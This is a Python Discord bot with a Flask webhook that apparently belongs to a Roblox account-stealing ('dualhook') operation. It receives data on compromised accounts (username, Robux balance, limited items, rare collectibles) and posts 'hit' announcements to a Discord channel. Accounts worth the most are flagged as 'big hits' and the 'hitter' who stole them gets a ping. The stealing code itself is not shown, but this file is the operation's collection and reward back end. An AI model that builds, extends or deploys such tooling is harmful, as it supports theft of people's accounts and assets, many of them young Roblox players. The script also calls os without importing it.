"""
Discord Bot that automatically receives dualhook data and sends embeds
No commands needed - fully automatic
"""

import discord
from discord.ext import commands
from datetime import datetime
from flask import Flask, request, jsonify
import threading

# Bot configuration
DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
CHANNEL_ID = 1453218537735852186
SERVER_INVITE = 'https://discord.gg/2jET66YxBH'

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Flask app for webhook
app = Flask(__name__)

def is_big_hit(hit_data):
    """Check if this is a big hit based on criteria"""
    try:
        balance = int(str(hit_data.get('balance', 0)).replace(',', ''))
        pending = int(str(hit_data.get('pending', 0)).replace(',', ''))
        limiteds = int(str(hit_data.get('limiteds', 0)).replace(',', ''))
        summary = int(str(hit_data.get('summary', 0)).replace(',', ''))
        headless = hit_data.get('headless', False)
        korblox = hit_data.get('korblox', False)
        
        # Big hit criteria
        if balance >= 1000 or pending >= 1000:
            return True
        if limiteds >= 1 and summary >= 500:
            return True
        if headless or korblox:
            return True
            
        return False
    except:
        return False

async def send_hit_notification(hit_data, hitter_id=None):
    """Automatically send hit notification - no commands needed"""
    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        print(f"❌ Could not find channel {CHANNEL_ID}")
        return
    
    # Determine if big hit
    big_hit = is_big_hit(hit_data)
    
    # Prepare mention if big hit and hitter_id provided
    mention_text = ""
    if big_hit and hitter_id:
        mention_text = f"<@{hitter_id}> "
    
    # Get data with defaults
    username = hit_data.get('username', 'Unknown')
    account_age = hit_data.get('account_age', '0')
    balance = hit_data.get('balance', '0')
    pending = hit_data.get('pending', '0')
    limiteds = hit_data.get('limiteds', '0')
    summary = hit_data.get('summary', '0')
    headless = hit_data.get('headless', False)
    korblox = hit_data.get('korblox', False)
    thumbnail_url = hit_data.get('thumbnail_url', '')
    
    # Format headless and korblox
    headless_text = "True" if headless else "False"
    korblox_text = "True" if korblox else "False"
    
    # Build embed description
    hit_type = "big hit" if big_hit else "hit"
    
    description = f"{mention_text}**────**<a:cross:1451101734289014824> **{hit_type} ────**\n\n"
    description += f"**<a:ak47:1451101638973718633> Account name:** {username}\n"
    description += f"**<a:cross:1451101734289014824> Account age:** {account_age} days\n\n"
    description += f"**═══ <:crown:1451375098710986924>Summary <:crown:1451375098710986924>═══**\n\n"
    description += f"**<a:ak47:1451101638973718633> Account Funds:**\n"
    description += f"**Balance:** {balance}\n"
    description += f"**Robux:** {pending}\n"
    description += f"**────** **────** **────**\n"
    description += f"**<a:ak47:1451101638973718633> Purchase:**\n"
    description += f"**Limiteds:** {limiteds}\n"
    description += f"**Summary:** {summary}\n"
    description += f"**────** **────** **────**\n"
    description += f"**<a:ak47:1451101638973718633> Collectibles:**\n"
    description += f"**Headless:** {headless_text}\n"
    description += f"**Korblox:** {korblox_text}"
    
    # Determine embed color
    embed_color = 0xFFFF00 if big_hit else 0x2b2d31
    
    embed = discord.Embed(
        description=description,
        color=embed_color,
        timestamp=datetime.now()
    )
    
    # Set thumbnail (profile picture)
    if thumbnail_url:
        embed.set_thumbnail(url=thumbnail_url)
    
    # Set image
    embed.set_image(url="https://media.discordapp.net/attachments/1435102270416097293/1442976770407272689/100.webp?ex=694c4e57&is=694afcd7&hm=42bce5d5a7c0c91ba1aaf08ba26fd970cb7987603b5bc03e17a2631e0b59ece2&")
    
    # Set footer with server invite
    embed.set_footer(text=f"Join: {SERVER_INVITE}")
    
    await channel.send(embed=embed)
    print(f"✅ AUTO SENT: {username} ({'BIG HIT' if big_hit else 'Normal hit'})")

@app.route('/webhook', methods=['POST'])
def webhook():
    """
    AUTOMATIC WEBHOOK - Receives hit data and sends immediately
    No commands or manual triggers needed
    """
    try:
        data = request.json
        print(f"📥 Received hit data: {data.get('username', 'Unknown')}")
        
        # Extract hit data
        hit_data = {
            'username': data.get('username'),
            'account_age': data.get('account_age'),
            'balance': data.get('balance'),
            'pending': data.get('pending'),
            'limiteds': data.get('limiteds'),
            'summary': data.get('summary'),
            'headless': data.get('headless', False),
            'korblox': data.get('korblox', False),
            'thumbnail_url': data.get('thumbnail_url')
        }
        
        hitter_id = data.get('hitter_id')  # Discord ID of the hitter
        
        # AUTOMATICALLY send notification - no commands needed!
        bot.loop.create_task(send_hit_notification(hit_data, hitter_id))
        
        return jsonify({'status': 'success', 'message': 'Hit sent automatically'}), 200
    except Exception as e:
        print(f"❌ Error processing webhook: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@bot.event
async def on_ready():
    print(f'✅ Bot logged in as {bot.user}')
    print(f'📢 Auto-sending hits to channel: {CHANNEL_ID}')
    print(f'🔗 Server invite: {SERVER_INVITE}')
    print(f'🎯 Webhook listening on: http://0.0.0.0:5000/webhook')
    print('✨ AUTOMATIC MODE: All hits will be sent instantly!')

def run_flask():
    """Run Flask webhook server"""
    print("🌐 Starting webhook server on port 5000...")
    app.run(host='0.0.0.0', port=5000)

# Run both Flask and Discord bot
if __name__ == "__main__":
    print("=" * 60)
    print("🚀 AUTOMATIC HIT SENDER BOT")
    print("=" * 60)
    print("⚙️  Configuration:")
    print(f"   • Channel ID: {CHANNEL_ID}")
    print(f"   • Server Invite: {SERVER_INVITE}")
    print(f"   • Mode: FULLY AUTOMATIC")
    print("=" * 60)
    print()
    
    # Start Flask webhook server in background
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Run Discord bot
    bot.run(DISCORD_TOKEN)
